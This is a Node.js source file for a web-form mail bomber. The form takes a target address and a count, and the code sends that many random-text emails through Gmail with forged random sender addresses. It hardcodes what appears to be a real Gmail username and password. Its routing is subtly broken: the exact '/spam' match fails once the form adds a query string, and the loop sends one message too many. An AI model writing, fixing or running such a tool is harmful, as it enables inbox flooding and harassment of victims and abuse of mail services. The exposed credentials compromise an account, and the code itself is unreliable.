var http = require('http');
var nodemailer = require('nodemailer');
var randomstring = require("randomstring");
var url = require('url');
http.createServer(function (req, res) {
    console.log(req.url);
    if (req.url == '/spam') {
        console.log("spamming");
        var q = url.parse(req.url, true);
        var qdata = q.query;

        var transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'dio.jomar495@gmail.com',
                pass: 'n2U4g9s&D5#uR7%k'
            }
        });
        var count = qdata.count;
        var to = qdata.to;
        for(x=0;x<=count;x++){
            var subject = randomstring.generate();
            var text = randomstring.generate();
            var from = randomstring.generate(5)+"@gmail.com";
            var mailOptions = {
            from: from,
            to: to,
            subject: subject,
            text: text
            };
            transporter.sendMail(mailOptions, function(error, info){
                if (error) {
                    console.log(error);
                } else {
                    console.log('Email sent: ' + info.response);
                }
            });
        }
    } else {
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.write('<form action="spam" method="get" enctype="multipart/form-data">');
      res.write('<input type="text" name="to" placeholder="Where to send"><br>');
      res.write('<input type="number" name="count" placeholder="Count Of email to send"><br>');
      res.write('<input type="submit">');
      res.write('</form>');
      return res.end();
    }
}).listen(8080);